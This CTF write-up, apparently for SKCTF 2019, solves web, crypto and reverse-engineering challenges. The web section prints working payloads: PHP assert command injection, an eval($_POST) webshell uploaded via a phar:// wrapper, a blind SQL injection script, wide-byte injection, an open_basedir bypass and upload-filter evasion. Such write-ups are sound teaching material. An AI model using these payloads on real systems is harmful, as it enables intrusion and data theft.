# web
## web1
- 修改前端改变元素属性，flag按钮得到源码

- `assert("file_exists('$page')");`闭合进行命令执行

- payload:

  ```
  file=test'.system('cat ./.ffll44gg').'
  ```

## web2

扫描发现`show.php`

上传一个图片后发现url变为`f=show&imageid=xxx`，猜测f参数是包含的文件名，并且自动加`.php`后缀

这里可以利用phar伪协议绕过自动加上php后缀的限制

新建一个`shell.php`内容为`<?php eval($_POST[cmd]); ?>`，压缩为zip文件，然后修改为png后缀上传,得到上传的路径，用phar伪协议包含

![Vo4LND.png](https://s2.ax1x.com/2019/06/15/Vo4LND.png)

## web3

简单的盲注 

过滤了`空格`,`,`,`for`,`and`,`%0d`,`%0a`等字符 利用括号和from绕过即可

exp:
```
# -*- coding: utf-8 -*-
import requests
url = 'http://192.168.138.12:8002/'
def check(payload):
    postdata = {'username':payload,'password':'xx'}
    r = requests.post(url, postdata).content
    return 'Username Wrong' in r

password  = ''
s = r'0123456789abcdef'

for i in xrange(32,0,-1):
    for c in s:
        payload = '\'or(mid((select(password)from(admin))from(%d))<>\'%s\')#' % (i, (c+password))
        if check(payload):
            password = c + password
            break
    print password
```

## web4
宽字节注入

payload:
```
?id=0%df%27union%20select%20flag,2,3%20from%20flag%23
```

## web5

题目限制`open_basedir`为`/var/www/html`，而flag在根目录中，同时禁用了所用能用来执行命令的函数

`open_basedir`绕过payload：
```
chdir('image');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));
```

## web6

base64忽略不在编码范围内的字符,php伪协议读源码得到flag

payload:
```
*c*G*h*w*O*i*8*v*Z*m*l*s*d*G*V*y*L*3*J*l*Y*W*Q*9*Y*2*9*u*d*m*V*y*d*C*5*i*Y*X*N*l*N*j*Q*t*Z*W*5*j*b*2*R*l*L*3*J*l*c*2*9*1*c*m*N*l*P*W*Z*s*Y*W*c*u*c*G*h*w*
```

## web7

`string sprintf( string $format[, mixed $args[, mixed $...]] )`

Returns a string produced according to the formatting string format. 


payload：
```
?myname=%s
```

## web8

- 爆破，收集信息得到目录
- ![Vo52rt.png](https://s2.ax1x.com/2019/06/15/Vo52rt.png)
  - 尝试add.php上传，看页面反应猜测只有前端只起迷惑作用。
- 文件包含，得到源码
  - 在`test.php`提示`put file parameter`猜测有文件包含漏洞
  - POST传入`file=php://filter/read=convert.base64-encode/resource=add.php`等等得到所有base64编码后的源码,base64解码得到源码
- 审计源码，查看sql过滤、上传过滤方式
  - sql过滤为：把`'`代替为空格，不好闭合。但是可以使第一个`‘`和第三个`'`来闭合注入使得sql语句为：即把`'`变成内容字符，而不是作为一个对于sql特殊意义的符号即可
    - `select * from skctf2019_admin where  password='\' and username=' or 1=1;#'`
    - ![Vo5y2d.png](https://s2.ax1x.com/2019/06/15/Vo5y2d.png)
  - upload过滤为：
    - 黑名单检测，去除后缀。双写即可绕过（还有很多别的绕过方式）
- 注入后登陆
- 上传得到shell
- 蚁剑连接，找到flag

# crypto
## rsa
已知n、e、d,求p、q

```
#!/usr/bin/env python2
# coding: utf-8
# 已知 d，求 p，q

import random
from md5 import md5

def gcd(a, b):
    if a < b:
        a, b = b, a
    while b != 0:
        temp = a % b
        a = b
        b = temp
    return a


def getpq(n, e, d):
    p = 1
    q = 1
    while p == 1 and q == 1:
        k = d * e - 1
        g = random.randint(0, n)
        while p == 1 and q == 1 and k % 2 == 0:
            k /= 2
            y = pow(g, k, n)
            if y != 1 and gcd(y-1, n) > 1:
                p = gcd(y-1, n)
                q = n/p
    return p, q



n = 16352578963372306131642407541567045533766691177138375676491913897592458965544068296813122740126583082006556217616296009516413202833698268845634497478988128850373221853516973259086845725813424850548682503827191121548693288763243619033224322698075987667531863213468223654181658012754897588147027437229269098246969811226129883327598021859724836993626315476699384610680857047403431430525708390695622848315322636785398223207468754197643541958599210127261345770914514670199047435085714403641469016212958361993969304545214061560160267760786482163373784437641808292654489343487613446165542988382687729593384887516272690654309  
e = 65537
d = 9459928379973667430138068528059438139092368625339079253289560577985304435062213121398231875832264894458314629575455553485752685643743266654630829957442008775259776311585654014858165341757547284112061885158006881475740553532826576260839430343960738520822367975528644329172668877696208741007648370045520535298040161675407779239300466681615493892692265542290255408673533853011662134953869432632554008235340864803377610352438146264524770710345273439724107080190182918285547426166561803716644089414078389475072103315432638197578186106576626728869020366214077455194554930725576023274922741115941214789600089166754476449453

p, q = getpq(n, e, d)
assert(p*q == n)
print p, q

print "Flag: SKCTF{%s}" %md5(str(p + q)).hexdigest()
```

## xor

简单的异或，爆破key
```
from base64 import b64decode
file=open("xor.txt","r").read()
# rJeekZuQkZjfqpGWiZqNjJaLht+Qmd+snJaakZya356Rm9+rmpyXkZCTkJiG9b6bm42ajIzFysjG366WnpGInpGYnpGY362QnpvT37eKnpGYm56Q37uWjIuNlpyL09+ulpGYm56Q09+sl56Rm5CRmN+vjZCJlpGcmtPfzcnJysbP09+v0a3RvJeWkZ71rLS8q7mEzpvJnsnLm8rGzc/Nyp7LzcbNmp2Zy5mZxpyZxsvOzsuC

ciphertext = b64decode(file)

for key in range(256):
    plaintext=''
    for i in ciphertext:
        plaintext+=chr(key^ord(i))
    if "SKCTF{" in plaintext:
        print plaintext

# Shandong University of Science and Technology
# Address:579 Qianwangang Road, Huangdao District, Qingdao, Shandong Province, 266590, P.R.China
# SKCTF{1d6a64d592025a4292ebf4ff9cf94114}
```

## 抓捕贪污犯
Affine密码
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : Dxx

#flag{QIBAIBASHIYIWANTOMYCARD}
#密钥：a=25 b=14 (mod 26)

import gmpy2

#已知两个不同字符加密前后的字母即可得出Affine密码的密钥a和b
#E(B)=a*B+b (mod 26) = N
#E(I)=a*I+b (mod 26) = G

#即13=1*a+b (mod 26)
#即 6=8*a+b (mod 26)
#两式子相减可求得密钥a，进而可以求得密钥b
#相减得 -7=7*a (mod 26)
#即 a=-7*7^-1 = 19 * 7^-1
#注意:所有运算在模26下运算（包括求逆元）

re = gmpy2.invert(7,26)
a = (19*re) % 26
b = (13-a)%26


def decrypt(key, c):
    return ''.join([unshift([a, b], ch) for ch in c])

def unshift(key, ch):
    offset = ord(ch) - ord('A')
    return chr((((key[0] * offset) + key[1]) % 26) + ord('A'))

if __name__ == '__main__':
	c = 'YGNOGNOWHGQGSOBVACQMOXL'
	key = [a,b]
	print decrypt(key,c)
```



# re

## RE1.exe

flag：you_know_the_knapsack_problem_

**题目考点**

1.逆向分析

2.数学分析

3.背包问题

**解题思路**

ida反编译

main函数

```
puts("please input flag:");
```

  	v5 = &v14;
  	scanf("%s", &v14);
  	for ( i = 0; *(&v14 + i); ++i )
  	{
    	if ( i > 32 )
    	  goto LABEL_12;
  	}
  	if ( i % 2 != 1 )
  	{
    	v8 = 1;
    	z(&v14, i, (int *)&_data_start__, &v15);
    	for ( j = 0; j <= 14; ++j )
    	{
    	  if ( *(&v15 + j) != flag[j] )
    	  {
    	    puts("try again");
    	    goto LABEL_12;
    	  }
    }
    puts("Congratulations!");

输入flag，判断输入的长度不大于32且是偶数，z函数处理输入，比较v15和已知的flag数组一致则输入正确。

看z函数
	

```
int __cdecl z(char *s, int n, int *a, int *c	)
	……
for ( i = 0; i < n; i += 2 )
```

  	{
    v7 = s[i + 1];
    v12 = 1;
     SwitchtoBin((int)&v19, v7);
    v7 = s[i];
    v12 = 2;
    SwitchtoBin((int)&v20, v7);
    v12 = 3;
    std::operator+<char,std::char_traits<char>,std::allocator<char>>(
      (int)&v18,
      (std::string *)&v20,
      (std::string *)&v19);
    v12 = 4;
    std::string::~string(v6);
    v12 = 5;
    std::string::~string(v6);
    c[v23] = 0;
    for ( j = 0; (signed int)j <= 9; j = (std::string *)((char *)j + 1) )
    {
      v10 = &c[v23];
      v9 = *v10;
      v12 = 6;
      v4 = (_BYTE *)std::string::operator[](j);
      *v10 = v9 + (*v4 - 48) * a[(_DWORD)j];
    }
    ++v23;
    v12 = 1;
    std::string::~string(v6);
  	}

swichtoBin主要是个结构体将字符转换成5位的二进制。
分析得该函数主要是处理输入的每一个字符，将字符转换成5位的二进制，两个一组，结合成一个10位的二进制。然后判断该二进制的每一位，如果该位为1则c加上数组a在该位的数字。例如，字母ab 0000100010 [1,3,5,11,21,44,87,175,349,701] c就是21+349=360。

c可以看成背包问题的背包容量，数组a则可以看成物品重量。由于已知a，且a是递增的，故可直接从大到小判断c是否比a[i]大，如果大则该位为1，最终推出10位的二进制数，再根据swichtobin的规则将其转换成字符得到flag。



#RE2.exe

flag：you_solved_the_knapsack_problem_

**题目考点**

1.逆向分析

2.数学分析

3.超递增背包加密

**解题思路**

是一个超递增背包加密算法。

IDA反编译看main函数

 	puts("please input flag:");
  	v5 = &v14;
  	scanf("%s", &v14);
  	for ( i = 0; *(&v14 + i); ++i )
  	{
    	if ( i > 32 )
    	  goto LABEL_15;
  	}
  	if ( i % 2 != 1 )
  	{
    	for ( j = 0; j <= 9; ++j )
    	  *(&v15 + j) = _data_start__[j] * t % ::k;
    	v8 = 1;
    	z(&v14, i, &v15, &v16);
    	for ( k = 0; k <= 15; ++k )
    	{
    	  if ( *(&v16 + k) != flag[k] )
    	  {
    	    puts("try again");
    	    goto LABEL_15;
    	  }
    	}
    	puts("Congratulations!");
  	}
输入flag，判断输入的长度不大于32且是偶数，对data_start数组进行模运算得到数组v15，z函数处理输入，比较v15和已知的flag数组一致则输入正确。

看z函数

```
int __cdecl z(char *s, int n, int *b, int *c)
 for ( i = 0; i < n; i += 2 )
 {
    v7 = s[i + 1];
	v12 = 1;
	SwitchtoBin((unsigned int)&v19);
	v7 = s[i];
	v12 = 2;
	SwitchtoBin((unsigned int)&v20);
	v12 = 3;
	std::operator+<char,std::char_traits<char>,std::allocator<char>>(
	  (int)&v18,
	  (std::string *)&v20,
	  (std::string *)&v19);
	v12 = 4;
	std::string::~string(v6);
	v12 = 5;
	std::string::~string(v6);
	c[v23] = 0;
		for ( j = 0; (signed int)j <= 9; j = (std::string *)((char *)j + 1) )
	{
	  v10 = &c[v23];
	  v9 = *v10;
	  v12 = 6;
	  v4 = (_BYTE *)std::string::operator[](j);
	  *v10 = v9 + (*v4 - 48) * b[(_DWORD)j];
	}
	++v23;
	v12 = 1;
	std::string::~string(v6);
```

  	}

swichtoBin主要是个结构体将字符转换成5位的二进制。

分析得该函数主要是处理输入的每一个字符，将字符转换成5位的二进制，两个一组，结合成一个10位的二进制。然后判断该二进制的每一位，如果该位为1则c加上数组b在该位的数字。

c相当于背包问题中的背包容量，而b相当于物品重量。现在已知背包容量求物品是否装入背包中。但是由于b是由递增的a转换成的非递增的数组，故无法直接用b求，可以用a求。但是c又是b的和。故需要将c转换成a的和。根据模运算的性质，b[i]=a[i]*t(mod(k)),故b的和=a的和\*t(mod(k))，故需要进行模逆运算，也就是a的和=b的和\*t的逆元(mod(k))。

得到a的和后，由于已知a，且a是递增的，故可直接从大到小判断c是否比a[i]大，如果大则该位为1，最终推出10位的二进制数，再根据swichtobin的规则将其转换成字符得到flag。

## CUBE

用 IDA 打开程序分析代码

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  signed int i; // [rsp+14h] [rbp-13Ch]
  signed int k; // [rsp+14h] [rbp-13Ch]
  signed int m; // [rsp+14h] [rbp-13Ch]
  signed int j; // [rsp+18h] [rbp-138h]
  signed int l; // [rsp+18h] [rbp-138h]
  signed int n; // [rsp+18h] [rbp-138h]
  int v10; // [rsp+1Ch] [rbp-134h]
  double v11; // [rsp+20h] [rbp-130h]
  double v12; // [rsp+28h] [rbp-128h]
  double v13; // [rsp+30h] [rbp-120h]
  double v14; // [rsp+38h] [rbp-118h]
  double v15; // [rsp+40h] [rbp-110h]
  double v16; // [rsp+48h] [rbp-108h]
  unsigned int v17; // [rsp+50h] [rbp-100h]
  unsigned int v18; // [rsp+54h] [rbp-FCh]
  unsigned int v19; // [rsp+58h] [rbp-F8h]
  unsigned int v20; // [rsp+5Ch] [rbp-F4h]
  unsigned int v21; // [rsp+60h] [rbp-F0h]
  unsigned int v22; // [rsp+64h] [rbp-ECh]
  unsigned int v23; // [rsp+68h] [rbp-E8h]
  unsigned int v24; // [rsp+6Ch] [rbp-E4h]
  unsigned int v25; // [rsp+70h] [rbp-E0h]
  unsigned int v26; // [rsp+74h] [rbp-DCh]
  unsigned int v27; // [rsp+78h] [rbp-D8h]
  unsigned int v28; // [rsp+7Ch] [rbp-D4h]
  unsigned int v29; // [rsp+80h] [rbp-D0h]
  unsigned int v30; // [rsp+84h] [rbp-CCh]
  unsigned int v31; // [rsp+88h] [rbp-C8h]
  unsigned int v32; // [rsp+8Ch] [rbp-C4h]
  double v33; // [rsp+90h] [rbp-C0h]
  double v34; // [rsp+98h] [rbp-B8h]
  double v35; // [rsp+A0h] [rbp-B0h]
  double v36; // [rsp+A8h] [rbp-A8h]
  double v37; // [rsp+B0h] [rbp-A0h]
  double v38; // [rsp+B8h] [rbp-98h]
  double v39; // [rsp+C0h] [rbp-90h]
  double v40; // [rsp+C8h] [rbp-88h]
  double v41; // [rsp+D0h] [rbp-80h]
  double v42; // [rsp+D8h] [rbp-78h]
  double v43; // [rsp+E0h] [rbp-70h]
  double v44; // [rsp+E8h] [rbp-68h]
  double v45; // [rsp+F0h] [rbp-60h]
  double v46; // [rsp+F8h] [rbp-58h]
  double v47; // [rsp+100h] [rbp-50h]
  double v48; // [rsp+108h] [rbp-48h]
  unsigned __int64 v49; // [rsp+118h] [rbp-38h]

  v49 = __readfsqword(0x28u);
  puts("Baby math game.");
  puts("Know it, than solve it...");
  for ( i = 0; i <= 3; ++i )
  {
    for ( j = 0; j <= 3; ++j )
    {
      argv = (&v17 + 4LL * i + j);
      __isoc99_scanf("%d", argv);
    }
  }
  for ( k = 0; k <= 3; ++k )
  {
    for ( l = 0; l <= 3; ++l )
    {
      if ( (*(&v17 + 4LL * k + l) & 0x80000000) != 0 )
      {
        puts("Wrong!");
        exit(0);
      }
    }
  }
  transform(&v17, argv);
  v10 = 0;
  for ( m = 0; m <= 3; ++m )
  {
    for ( n = 0; n <= 3; ++n )
      *(&v33 + v10++) = *(&v17 + 4LL * m + n);
  }
  v11 = sqrt(v35 * v35 + v33 * v33 + v34 * v34);
  if ( v11 > 0.0001 || v11 < -0.0001 )
  {
    puts("Wrong!");
    exit(0);
  }
  if ( v35 != 0.0 || v39 != 0.0 || v43 != 0.0 || v47 != 0.0 )
  {
    puts("Wrong!");
    exit(0);
  }
  v12 = sqrt((v39 - v35) * (v39 - v35) + (v37 - v33) * (v37 - v33) + (v38 - v34) * (v38 - v34));
  v13 = sqrt((v43 - v39) * (v43 - v39) + (v41 - v37) * (v41 - v37) + (v42 - v38) * (v42 - v38));
  v14 = sqrt((v47 - v43) * (v47 - v43) + (v45 - v41) * (v45 - v41) + (v46 - v42) * (v46 - v42));
  v15 = sqrt((v47 - v35) * (v47 - v35) + (v45 - v33) * (v45 - v33) + (v46 - v34) * (v46 - v34));
  if ( v12 != v13 || v12 != v14 || v12 != v15 || v13 != v14 || v13 != v15 || v14 != v15 )
  {
    puts("Wrong!");
    exit(0);
  }
  if ( v12 - 1.0 > 0.0001 || v12 - 1.0 < -0.0001 )
  {
    puts("Wrong!");
    exit(0);
  }
  if ( v36 != v40 || v36 != v44 || v48 != v36 || v40 != v44 || v40 != v48 || v44 != v48 )
  {
    puts("Wrong!");
    exit(0);
  }
  v16 = sqrt(v40 * v40 + v13 * v13);
  if ( v16 - 6.082762 > 0.0001 || v16 - 6.082762 < -0.0001 )
  {
    puts("Wrong!");
    exit(0);
  }
  printf(
    "Congrats! You flag is: skctf{%d%d%d%d-%d%d%d%d%d%d%d%d-%d%d%d%d}\n",
    v17,
    v18,
    v19,
    v20,
    v21,
    v22,
    v23,
    v24,
    v25,
    v26,
    v27,
    v28,
    v29,
    v30,
    v31,
    v32);
  return 0;
}
```

整个程序的代码非常清晰，不涉及太多的逆向技巧，本题主要考察的是分析算法。

我们需要输入 4 * 4 = 16 个整型数字(大于 0 )，程序将这些数据保存在一个数组中，看到这种逻辑很容易想到这是一个矩阵，在 IDA 中对相关变量重命名/类型改变之后代码如下

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  signed int i; // [rsp+14h] [rbp-13Ch]
  signed int k; // [rsp+14h] [rbp-13Ch]
  signed int m; // [rsp+14h] [rbp-13Ch]
  signed int j; // [rsp+18h] [rbp-138h]
  signed int l; // [rsp+18h] [rbp-138h]
  signed int n; // [rsp+18h] [rbp-138h]
  int v10; // [rsp+1Ch] [rbp-134h]
  double v11; // [rsp+20h] [rbp-130h]
  double v12; // [rsp+28h] [rbp-128h]
  double v13; // [rsp+30h] [rbp-120h]
  double v14; // [rsp+38h] [rbp-118h]
  double v15; // [rsp+40h] [rbp-110h]
  double v16; // [rsp+48h] [rbp-108h]
  unsigned int v17[4][4]; // [rsp+50h] [rbp-100h]
  double v18[16]; // [rsp+90h] [rbp-C0h]
  unsigned __int64 v19; // [rsp+118h] [rbp-38h]

  v19 = __readfsqword(0x28u);
  puts("Baby math game.");
  puts("Know it, than solve it...");
  for ( i = 0; i <= 3; ++i )
  {
    for ( j = 0; j <= 3; ++j )
    {
      argv = (v17 + 4 * (4LL * i + j));
      __isoc99_scanf("%d", argv);
    }
  }
  for ( k = 0; k <= 3; ++k )
  {
    for ( l = 0; l <= 3; ++l )
    {
      if ( (v17[0][4LL * k + l] & 0x80000000) != 0 )
      {
        puts("Wrong!");
        exit(0);
      }
    }
  }
  transform(v17, argv);
  v10 = 0;
  for ( m = 0; m <= 3; ++m )
  {
    for ( n = 0; n <= 3; ++n )
      v18[v10++] = v17[0][4LL * m + n];
  }
  v11 = sqrt(v18[2] * v18[2] + v18[0] * v18[0] + v18[1] * v18[1]);
  if ( v11 > 0.0001 || v11 < -0.0001 )
  {
    puts("Wrong!");
    exit(0);
  }
  if ( v18[2] != 0.0 || v18[6] != 0.0 || v18[10] != 0.0 || v18[14] != 0.0 )
  {
    puts("Wrong!");
    exit(0);
  }
  v12 = sqrt(
          (v18[6] - v18[2]) * (v18[6] - v18[2])
        + (v18[4] - v18[0]) * (v18[4] - v18[0])
        + (v18[5] - v18[1]) * (v18[5] - v18[1]));
  v13 = sqrt(
          (v18[10] - v18[6]) * (v18[10] - v18[6])
        + (v18[8] - v18[4]) * (v18[8] - v18[4])
        + (v18[9] - v18[5]) * (v18[9] - v18[5]));
  v14 = sqrt(
          (v18[14] - v18[10]) * (v18[14] - v18[10])
        + (v18[12] - v18[8]) * (v18[12] - v18[8])
        + (v18[13] - v18[9]) * (v18[13] - v18[9]));
  v15 = sqrt(
          (v18[14] - v18[2]) * (v18[14] - v18[2])
        + (v18[12] - v18[0]) * (v18[12] - v18[0])
        + (v18[13] - v18[1]) * (v18[13] - v18[1]));
  if ( v12 != v13 || v12 != v14 || v12 != v15 || v13 != v14 || v13 != v15 || v14 != v15 )
  {
    puts("Wrong!");
    exit(0);
  }
  if ( v12 - 1.0 > 0.0001 || v12 - 1.0 < -0.0001 )
  {
    puts("Wrong!");
    exit(0);
  }
  if ( v18[3] != v18[7]
    || v18[3] != v18[11]
    || v18[15] != v18[3]
    || v18[7] != v18[11]
    || v18[7] != v18[15]
    || v18[11] != v18[15] )
  {
    puts("Wrong!");
    exit(0);
  }
  v16 = sqrt(v18[7] * v18[7] + v13 * v13);
  if ( v16 - 6.082762 > 0.0001 || v16 - 6.082762 < -0.0001 )
  {
    puts("Wrong!");
    exit(0);
  }
  printf(
    "Congrats! You flag is: skctf{%d%d%d%d-%d%d%d%d%d%d%d%d-%d%d%d%d}\n",
    v17[0][0],
    v17[0][1],
    v17[0][2],
    v17[0][3],
    v17[1][0],
    v17[1][1],
    v17[1][2],
    v17[1][3],
    v17[2][0],
    v17[2][1],
    v17[2][2],
    v17[2][3],
    v17[3][0],
    v17[3][1],
    v17[3][2],
    v17[3][3]);
  return 0;
}
```

然后是 transform 函数

```c
unsigned __int64 __fastcall transform(__int64 a1)
{
  signed int i; // [rsp+18h] [rbp-58h]
  signed int k; // [rsp+18h] [rbp-58h]
  signed int j; // [rsp+1Ch] [rbp-54h]
  signed int l; // [rsp+1Ch] [rbp-54h]
  int v6[4][4]; // [rsp+20h] [rbp-50h]
  unsigned __int64 v7; // [rsp+68h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  for ( i = 0; i <= 3; ++i )
  {
    for ( j = 0; j <= 3; ++j )
      v6[0][4LL * j + i] = *(a1 + 16LL * i + 4LL * j);
  }
  for ( k = 0; k <= 3; ++k )
  {
    for ( l = 0; l <= 3; ++l )
      *(16LL * k + a1 + 4LL * l) = v6[0][4LL * k + l];
  }
  return __readfsqword(0x28u) ^ v7;
}
```

结合函数名字和代码(或者调试)，推测这个函数对传入的矩阵做了一次转置运算(行列交换)。

下一段逻辑将矩阵中的数据取出，放在了一个一维数组中(v18)，然后使用数组中的前三个元素做了一次运算，可以将其总结为 v9 = √a^2 + b^2 + c^2，这是计算空间直角坐标系点到原点之间距离的公式，猜测 4 * 4 矩阵中每 4 个元素一组，前三个组成空间直角坐标系中的一个点，接着会对求出的长度进行检查，要求第一个点位于原点。另外三个点的纵坐标必须为零

```c
  if ( v16[2] != 0.0 || v16[6] != 0.0 || v16[10] != 0.0 || v16[14] != 0.0 )
  {
    puts("Wrong!");
    exit(0);
  }
```

然后分别求出第一二、二三、三四、一四 两两之间的距离，要求他们相等。显然我们输入的四个点需要组成一个原点位于 O 点的正方形。后面的代码还要求两点的距离为 1.

```c
  if ( v10 - 1.0 > 0.0001 || v10 - 1.0 < -0.0001 )
  {
    puts("Wrong!");
    exit(0);
  }
```

接下来开始处理每组的最后一个元素，代码要求它们相等

```c
  if ( v16[3] != v16[7]
    || v16[3] != v16[11]
    || v16[15] != v16[3]
    || v16[7] != v16[11]
    || v16[7] != v16[15]
    || v16[11] != v16[15] )
  {
    puts("Wrong!");
    exit(0);
  }
```

接着利用第二个点的元素做 v14 = sqrt(v16[7] * v16[7] + v11 * v11);  运算，要求结果等于 6.082762。

实际上这个矩阵定义了位于空间直角坐标系的一个长方体，上面实现的计算意义是长方体右侧面对角线的长度要等于 6.082762，由于底面长度之前已经确定为 1，那么侧面高度的平方 = 6.082762 * 6.082762 - 1 * 1 = 35.999 约等于 36，开方等于 6.

将上面的逻辑总结起来，我们的输入就是 0 1 1 0 0 0 1 1 0 0 0 0 6 6 6 6，构成转置后的矩阵为

```
0 0 0 6
1 0 0 6
1 1 0 6
0 1 0 6
```

四个点的坐标分别是 (0, 0, 0), (1, 0, 0), (1, 1, 0), (0, 1, 0)，高度为 6。

flag: skctf{0006-10061106-0106}